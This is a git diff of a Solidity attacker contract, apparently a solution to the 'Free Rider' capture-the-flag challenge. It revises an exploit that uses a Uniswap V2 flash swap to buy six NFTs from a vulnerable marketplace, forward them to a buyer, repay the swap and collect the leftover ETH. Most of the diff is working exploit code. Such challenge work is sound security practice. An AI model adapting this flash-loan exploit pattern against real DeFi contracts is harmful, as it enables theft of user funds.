@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "../free-rider/FreeRiderNFTMarketplace.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 interface IWETH {
     function deposit() external payable;
@@ -13,11 +14,11 @@ interface IWETH {
     function withdraw(uint256) external;
 }
 
-contract FreeRiderAttacker {
+contract FreeRiderAttacker is IERC721Receiver {
     FreeRiderNFTMarketplace private immutable marketplace;
     IUniswapV2Pair private immutable uniswapPair;
     IERC721 private immutable NFTs;
-    IWETH private immutable WETH;
+    IWETH public WETH;
 
     address private immutable attacker;
     address private immutable buyer;
@@ -42,7 +43,7 @@ contract FreeRiderAttacker {
 
     function attack(uint256 _amount) external payable {
         require(msg.sender == attacker);
-        bytes memory data = "1";
+        bytes memory data = abi.encode(WETH);
 
         // 1. Do the flash swap to get WETH
         uniswapPair.swap(
@@ -51,6 +52,13 @@ contract FreeRiderAttacker {
             address(this), // recipient of flash swap
             data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)
         );
+
+        for (uint256 i = 0; i < 6; i++) {
+            NFTs.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
+        }
+
+        // (bool success, ) = attacker.call{value: address(this).balance}("");
+        // require(success, "ETH transfer failed");
     }
 
     function uniswapV2Call(
@@ -59,29 +67,17 @@ contract FreeRiderAttacker {
         uint256,
         bytes calldata
     ) external {
-        // 2. Deposit WETH to get ETH
-        WETH.deposit{value: amount0}();
+        // Security measures
+        require(msg.sender == address(uniswapPair) && tx.origin == attacker);
 
-        // 3. Buy the NFTs
+        WETH.withdraw(amount0);
         marketplace.buyMany{value: amount0}(tokenIds);
 
-        // 6. Send NFTs to buyer
-        for (uint256 i = 0; i < 6; i++) {
-            NFTs.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
-        }
-
-        // 4. Deposit ETH to get WETH
-        WETH.withdraw(amount0);
-
-        // 5. Pay the WETH flash swap back
         uint256 _fee = ((amount0 * 3) / 997) + 1; // 1+ is there in case the integer division equals zero.
         uint256 _repayAmount = _fee + amount0;
-        WETH.deposit{value: amount0}();
-        WETH.transfer(address(uniswapPair), _repayAmount);
 
-        // 7. Transfer ETH to attacker
-        (bool success, ) = attacker.call{value: address(this).balance}("");
-        require(success, "ETH transfer failed");
+        WETH.deposit{value: _repayAmount}();
+        WETH.transfer(address(uniswapPair), _repayAmount);
     }
 
     // Function that allows this contract to receive NFTs
@@ -90,8 +86,8 @@ contract FreeRiderAttacker {
         address,
         uint256,
         bytes memory
-    ) external view returns (bytes4) {
+    ) external view override returns (bytes4) {
         require(msg.sender == address(NFTs) && tx.origin == attacker);
-        return 0x150b7a02; // ERC721Receiver.onERC721Received.selector
+        return IERC721Receiver.onERC721Received.selector; //0x150b7a02;
     }
 }
